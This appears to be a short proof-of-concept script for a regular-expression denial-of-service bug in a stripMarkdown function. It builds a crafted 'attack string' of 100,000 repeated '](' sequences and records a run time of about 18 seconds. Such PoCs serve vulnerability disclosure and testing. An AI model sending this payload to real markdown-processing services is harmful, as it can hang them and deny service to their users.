import StringUtils from "./stringUtils.js";

//Attack String :"[ "+"]("*100000+"◎"
var str = "[ ";
for (var i = 0; i < 100000; i++) {
  str += "](";
}
str += "◎";

console.log(StringUtils.stripMarkdown(str));

// real    0m17.896s
// user    0m17.844s
// sys     0m0.040s